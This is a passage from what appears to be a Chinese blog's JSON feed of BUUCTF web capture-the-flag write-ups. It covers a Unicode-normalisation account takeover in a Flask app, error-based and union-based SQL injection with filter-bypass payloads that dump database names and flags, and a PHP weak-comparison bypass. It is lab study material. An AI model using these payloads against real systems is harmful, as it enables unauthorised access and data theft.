title=\"Unicode欺骗\"></a>Unicode欺骗</h4><p>利用解码机制，传入一个非预期的值得到预期的结果</p>\n<p>引用上面<code>routes.py</code></p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/register'</span><span class=\"token punctuation\">,</span> methods <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">register</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\n    <span class=\"token keyword\">if</span> current_user<span class=\"token punctuation\">.</span>is_authenticated<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'index'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    form <span class=\"token operator\">=</span> RegisterForm<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>method <span class=\"token operator\">==</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">:</span>\n        name <span class=\"token operator\">=</span> strlower<span class=\"token punctuation\">(</span>form<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'image'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> form<span class=\"token punctuation\">.</span>verify_code<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            flash<span class=\"token punctuation\">(</span><span class=\"token string\">'Wrong verify code.'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'register.html'</span><span class=\"token punctuation\">,</span> title <span class=\"token operator\">=</span> <span class=\"token string\">'register'</span><span class=\"token punctuation\">,</span> form<span class=\"token operator\">=</span>form<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> User<span class=\"token punctuation\">.</span>query<span class=\"token punctuation\">.</span>filter_by<span class=\"token punctuation\">(</span>username <span class=\"token operator\">=</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>first<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            flash<span class=\"token punctuation\">(</span><span class=\"token string\">'The username has been registered'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'register'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        user <span class=\"token operator\">=</span> User<span class=\"token punctuation\">(</span>username<span class=\"token operator\">=</span>name<span class=\"token punctuation\">)</span>\n        user<span class=\"token punctuation\">.</span>set_password<span class=\"token punctuation\">(</span>form<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span>\n        db<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">)</span>\n        db<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">.</span>commit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        flash<span class=\"token punctuation\">(</span><span class=\"token string\">'register successful'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'login'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'register.html'</span><span class=\"token punctuation\">,</span> title <span class=\"token operator\">=</span> <span class=\"token string\">'register'</span><span class=\"token punctuation\">,</span> form <span class=\"token operator\">=</span> form<span class=\"token punctuation\">)</span>\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/login'</span><span class=\"token punctuation\">,</span> methods <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> current_user<span class=\"token punctuation\">.</span>is_authenticated<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'index'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    form <span class=\"token operator\">=</span> LoginForm<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>method <span class=\"token operator\">==</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">:</span>\n        name <span class=\"token operator\">=</span> strlower<span class=\"token punctuation\">(</span>form<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span>\n        session<span class=\"token punctuation\">[</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> name\n        user <span class=\"token operator\">=</span> User<span class=\"token punctuation\">.</span>query<span class=\"token punctuation\">.</span>filter_by<span class=\"token punctuation\">(</span>username<span class=\"token operator\">=</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>first<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> user <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">not</span> user<span class=\"token punctuation\">.</span>check_password<span class=\"token punctuation\">(</span>form<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            flash<span class=\"token punctuation\">(</span><span class=\"token string\">'Invalid username or password'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'login'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        login_user<span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">,</span> remember<span class=\"token operator\">=</span>form<span class=\"token punctuation\">.</span>remember_me<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'index'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'login.html'</span><span class=\"token punctuation\">,</span> title <span class=\"token operator\">=</span> <span class=\"token string\">'login'</span><span class=\"token punctuation\">,</span> form <span class=\"token operator\">=</span> form<span class=\"token punctuation\">)</span>\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/change'</span><span class=\"token punctuation\">,</span> methods <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">change</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> current_user<span class=\"token punctuation\">.</span>is_authenticated<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'login'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    form <span class=\"token operator\">=</span> NewpasswordForm<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>method <span class=\"token operator\">==</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">:</span>\n        name <span class=\"token operator\">=</span> strlower<span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">[</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        user <span class=\"token operator\">=</span> User<span class=\"token punctuation\">.</span>query<span class=\"token punctuation\">.</span>filter_by<span class=\"token punctuation\">(</span>username<span class=\"token operator\">=</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>first<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        user<span class=\"token punctuation\">.</span>set_password<span class=\"token punctuation\">(</span>form<span class=\"token punctuation\">.</span>newpassword<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span>\n        db<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">.</span>commit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        flash<span class=\"token punctuation\">(</span><span class=\"token string\">'change successful'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'index'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'change.html'</span><span class=\"token punctuation\">,</span> title <span class=\"token operator\">=</span> <span class=\"token string\">'change'</span><span class=\"token punctuation\">,</span> form <span class=\"token operator\">=</span> form<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">strlower</span><span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    username <span class=\"token operator\">=</span> nodeprep<span class=\"token punctuation\">.</span>prepare<span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> username<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这几个模块中都调用了<code>nodeprep.prepare</code>这个函数</p>\n<p>查阅资料</p>\n<p><code>nodeprep.prepare</code>这个函数会把大写转换为小写 并且会做如下转换<br>假如有一个<code>ᴬ</code>字符 第一次调用函数时会造成<code>ᴬ-&gt;A</code>，第二次调用时会<code>A-&gt;a</code><br>所以思路就是 我们注册一个<code>ᴬdmin</code>账号 此时第一次调用<code>nodeprep.prepare</code> 账号变为<br><code>Admin</code>,在修改密码，会再次调用<code>nodeprep.prepare</code>,这是就变成了<code>admin</code></p>\n<p>再用改的密码登录admin就成功了</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/61f32fe1637fae1ee2a8518376ec863f.png\"></p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/0b7140acc16e55a440c1a3cca110b993.png\"><img src=\"https://z3.ax1x.com/2021/03/29/c9ERk4.png\" alt=\"c9ERk4.png\"></p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/0d71cb0dbfc9d7ce0c338760b7caa735.png\"></p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/78d77b713bfeff7b558f66944ef1991e.png\"></p>\n",
            "tags": [
                "web",
                "wp",
                "BUUCTF"
            ]
        },
        {
            "id": "https://0xdadream.github.io/2021/03/17/ji-ke-da-tiao-zhan-2019-hardsql/",
            "url": "https://0xdadream.github.io/2021/03/17/ji-ke-da-tiao-zhan-2019-hardsql/",
            "title": "极客大挑战_2019 HardSQL",
            "date_published": "2021-03-17T01:25:00.000Z",
            "content_html": "<p>打开页面，还是注入</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">?username<span class=\"token operator\">=</span>admin<span class=\"token string\">' or '</span><span class=\"token number\">1</span><span class=\"token string\">'='</span><span class=\"token number\">1</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span><span class=\"token operator\">&amp;</span>password<span class=\"token operator\">=</span>password<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>万能密码不行，并且一直是相同的返回信息，被过滤了就会显示这个</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/c717a388a2c047cdc8fe689ae6563e70.png\"></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">?username<span class=\"token operator\">=</span>admin'<span class=\"token operator\">&amp;</span>password<span class=\"token operator\">=</span>password<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/b0f8125ffd379233b710c42385b18ca7.png\"></p>\n<p>报错可以报错注入</p>\n<p>构造payload,这里还过滤了空格(括号绕过)</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">?username<span class=\"token operator\">=</span>admin<span class=\"token string\">'or(updatexml(1,concat(0x7e,(select(database())),0x7e),1))%23&amp;password=1\nor\n?username=admin'</span><span class=\"token operator\">or</span><span class=\"token punctuation\">(</span>extractvalue<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">23</span><span class=\"token operator\">&amp;</span>password<span class=\"token operator\">=</span><span class=\"token number\">1</span>\n\nXPATH syntax error: <span class=\"token string\">'~geek~'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">?username<span class=\"token operator\">=</span>admin<span class=\"token string\">'or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&amp;password=1\n\nXPATH syntax error: '</span><span class=\"token operator\">~</span>H4rDsq1<span class=\"token operator\">~</span>'<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">?username<span class=\"token operator\">=</span>admin<span class=\"token string\">'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('</span>H4rDsq1<span class=\"token string\">')),0x7e),1))%23&amp;password=1\n\n\nXPATH syntax error: '</span><span class=\"token operator\">~</span>id<span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>password<span class=\"token operator\">~</span>'<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">?username<span class=\"token operator\">=</span>admin<span class=\"token string\">'or(updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1))%23&amp;password=1\n\nXPATH syntax error: '</span><span class=\"token operator\">~</span>flag{ee2d297b<span class=\"token operator\">-</span>ca3d<span class=\"token operator\">-</span><span class=\"token number\">4</span>d9e<span class=\"token operator\">-</span><span class=\"token number\">9</span>c8a<span class=\"token operator\">-</span>d2'<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>flag没全部输出，大笑.gif</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">?username<span class=\"token operator\">=</span>admin<span class=\"token string\">'or(updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)),0x7e),1))%23&amp;password=1\n\nXPATH syntax error: '</span><span class=\"token operator\">~</span>b<span class=\"token operator\">-</span>ca3d<span class=\"token operator\">-</span><span class=\"token number\">4</span>d9e<span class=\"token operator\">-</span><span class=\"token number\">9</span>c8a<span class=\"token operator\">-</span>d23113610a22}<span class=\"token operator\">~</span>'<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n",
            "tags": [
                "web",
                "wp",
                "BUUCTF"
            ]
        },
        {
            "id": "https://0xdadream.github.io/2021/03/09/actf2020-xin-sheng-sai-backupfile/",
            "url": "https://0xdadream.github.io/2021/03/09/actf2020-xin-sheng-sai-backupfile/",
            "title": "ACTF2020_新生赛 BackupFile",
            "date_published": "2021-03-09T15:25:00.000Z",
            "content_html": "<h2 id=\"ACTF2020-新生赛-BackupFile\"><a href=\"#ACTF2020-新生赛-BackupFile\" class=\"headerlink\" title=\"[ACTF2020 新生赛]BackupFile\"></a>[ACTF2020 新生赛]BackupFile</h2><p>扫描目录，下载index.php.bak(这就是备份文件)<img src=\"https://images.dadream.eu.org/images/2024/07/eb4ca6d67bc1757f92fcbc135fe55664.png\"><code>index.php.bak</code>代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">include_once</span> <span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$key</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Just num!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token variable\">$key</span> <span class=\"token operator\">=</span> <span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Try to find out source file!\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>代码审计</p>\n<p>$key不为数字，且等于$str,显示flag</p>\n<p>这里涉及到php的弱类型，123==”123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3”</p>\n<p>传入参数得到flag</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">payload：\n<span class=\"token operator\">?</span>key<span class=\"token operator\">=</span><span class=\"token number\">123</span><span class=\"token operator\">&amp;</span>str<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n",
            "tags": [
                "web",
                "wp",
                "BUUCTF"
            ]
        },
        {
            "id": "https://0xdadream.github.io/2021/03/09/ji-ke-da-tiao-zhan-2019-babysql/",
            "url": "https://0xdadream.github.io/2021/03/09/ji-ke-da-tiao-zhan-2019-babysql/",
            "title": "极客大挑战_2019 BabySQL",
            "date_published": "2021-03-09T02:25:00.000Z",
            "content_html": "<h2 id=\"极客大挑战-2019-BabySQL\"><a href=\"#极客大挑战-2019-BabySQL\" class=\"headerlink\" title=\"[极客大挑战 2019]BabySQL\"></a>[极客大挑战 2019]BabySQL</h2><p>有登录的一般都会想到万能密码，过滤了大不了绕过吧，和前面没多大区别</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">check</span><span class=\"token punctuation\">.</span>php?username<span class=\"token operator\">=</span>admin<span class=\"token string\">' or '</span><span class=\"token number\">1</span><span class=\"token string\">'='</span><span class=\"token number\">1</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span><span class=\"token operator\">&amp;</span>password<span class=\"token operator\">=</span>password<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>未能成功，双写绕过<code>or</code>试试</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">check</span><span class=\"token punctuation\">.</span>php?username<span class=\"token operator\">=</span>admin<span class=\"token string\">' oorr '</span><span class=\"token number\">1</span><span class=\"token string\">'='</span><span class=\"token number\">1</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span><span class=\"token operator\">&amp;</span>password<span class=\"token operator\">=</span>password<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这里确实存在注入点，成功了，开始注入</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">check</span><span class=\"token punctuation\">.</span>php?username<span class=\"token operator\">=</span><span class=\"token string\">' union select 1,2  %23&amp;password=password\n报错，双写union select\ncheck.php?username='</span> ununionion selselectect <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span>  <span class=\"token operator\">%</span><span class=\"token number\">23</span><span class=\"token operator\">&amp;</span>password<span class=\"token operator\">=</span>password\nThe used <span class=\"token keyword\">SELECT</span> statements have a different number <span class=\"token keyword\">of</span> <span class=\"token keyword\">columns</span>\n\n<span class=\"token keyword\">check</span><span class=\"token punctuation\">.</span>php?username<span class=\"token operator\">=</span>admin<span class=\"token string\">' ororderder by 3 %23&amp;password=2\norder被pass了，直接挨着猜\ncheck.php?username='</span> ununionion selselectect <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span>  <span class=\"token operator\">%</span><span class=\"token number\">23</span><span class=\"token operator\">&amp;</span>password<span class=\"token operator\">=</span><span class=\"token number\">2</span>\n<span class=\"token number\">3</span>列，哈哈<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">check</span><span class=\"token punctuation\">.</span>php?username<span class=\"token operator\">=</span><span class=\"token string\">' ununionion selselectect 1,version(),database()  %23&amp;password=2\n//Hello 10.3.18-MariaDB！\n//Your password is '</span>geek'\n<span class=\"token comment\">//得到数据库版本和当前数据库名称</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>爆所有数据库名</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">check</span><span class=\"token punctuation\">.</span>php?username<span class=\"token operator\">=</span><span class=\"token string\">' ununionion selselectect 1,2,group_concat(schema_name) frofromm infoorrmation_schema.schemata  %23&amp;password=2\nHello 2！\nYour password is '</span>information_schema<span class=\"token punctuation\">,</span>mysql<span class=\"token punctuation\">,</span>performance_schema<span class=\"token punctuation\">,</span>test<span class=\"token punctuation\">,</span>ctf<span class=\"token punctuation\">,</span>geek'<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><code>ctf</code>可疑，爆表名</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">check</span><span class=\"token punctuation\">.</span>php?username<span class=\"token operator\">=</span><span class=\"token operator\">%</span><span class=\"token number\">27</span> ununionion seselectlect <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span>frfromom<span class=\"token punctuation\">(</span>infoorrmation_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span><span class=\"token punctuation\">)</span>\nwhwhereere table_schema<span class=\"token operator\">=</span><span class=\"token string\">'ctf'</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span><span class=\"token operator\">&amp;</span>password<span class=\"token operator\">=</span><span class=\"token number\">1</span> \nHello <span class=\"token number\">2</span>！\nYour password <span class=\"token operator\">is</span> <span class=\"token string\">'Flag'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>爆列名</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">check</span><span class=\"token punctuation\">.</span>php?username<span class=\"token operator\">=</span><span class=\"token operator\">%</span><span class=\"token number\">27</span> ununionion seselectlect <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>group_concat<span class=\"token punctuation\">(</span>column_name<span class=\"token punctuation\">)</span>frfromom<span class=\"token punctuation\">(</span>infoorrmation_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span><span class=\"token punctuation\">)</span>\nwhwhereere table_name<span class=\"token operator\">=</span><span class=\"token string\">'Flag'</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span><span class=\"token operator\">&amp;</span>password<span class=\"token operator\">=</span><span class=\"token number\">1</span> \nHello <span class=\"token number\">2</span>！\nYour password <span class=\"token operator\">is</span> <span class=\"token string\">'flag'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>爆数据</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">check</span><span class=\"token punctuation\">.</span>php?username<span class=\"token operator\">=</span><span class=\"token operator\">%</span><span class=\"token number\">27</span> ununionion seselectlect <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>group_concat<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span>frfromom<span class=\"token punctuation\">(</span>ctf<span class=\"token punctuation\">.</span>Flag<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">23</span><span class=\"token operator\">&amp;</span>password<span class=\"token operator\">=</span><span class=\"token number\">1</span> \nHello <span class=\"token number\">2</span>！\nYour password <span class=\"token operator\">is</span> <span class=\"token string\">'flag{cc46361f-7094-4e08-a744-2c4c3fcc9eb0}'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n",
            "tags": [
                "web",
                "wp",
                "BUUCTF"
            ]
        },
        {
            "id": "https://0xdadream.github.io/2021/03/08/ji-ke-da-tiao-zhan-2019-php/",
            "url": "https://0xdadream.github.io/2021/03/08/ji-ke-da-tiao-zhan-2019-php/",
            "title": "极客大挑战_2019 PHP",
            "date_published": "2021-03-08T01:25:00.000Z",
